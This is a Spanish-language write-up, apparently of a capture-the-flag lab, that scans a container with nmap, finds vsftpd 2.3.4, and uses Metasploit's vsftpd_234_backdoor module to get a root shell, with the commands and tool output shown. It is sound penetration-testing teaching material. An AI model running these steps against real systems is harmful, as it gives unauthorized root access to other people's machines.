## Utilizamos nmap para detectar puertos y servicios
```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

### info
```plaintext
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
|_ftp-anon: got code 500 "OOPS: cannot change directory:/var/ftp".
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:42:AC:11:00:03 (Unknown)
Service Info: OS: Unix
```

## Análisis
Se puede observar el servicio vsfpd con la versión 2.3.4 en el cual existe un exploit asociada a el

## Metasploit
```bash
msfconsole
```

Luego de acceder a la terminal de Metasploit vamos a buscar el sploit asociada al servicio:

```bash
search vsftpd 2.3.4
```

```plaintext
   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution

```

Ahora vamos a configurar el exploit:
```bash
use 0
```

Tenemos que setear la IP del exploit por la IP de la víctima y lo ejecutamos.
```bash
set RHOST <IP>
run
```

```plaintext
[*] 172.17.0.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 172.17.0.3:21 - USER: 331 Please specify the password.
[+] 172.17.0.3:21 - Backdoor service has been spawned, handling...
[+] 172.17.0.3:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.

```

Encontramos la terminal y como usuario root.
```bash
whoami
root
```

## Resumen
Detectamos el servicio vsftpd 2.3.4 usando nmap, versión conocida por tener una vulnerabilidad de backdoor. Con Metasploit, buscamos y configuramos el exploit para esta versión, logrando acceso a una shell con privilegios root en el sistema vulnerable.

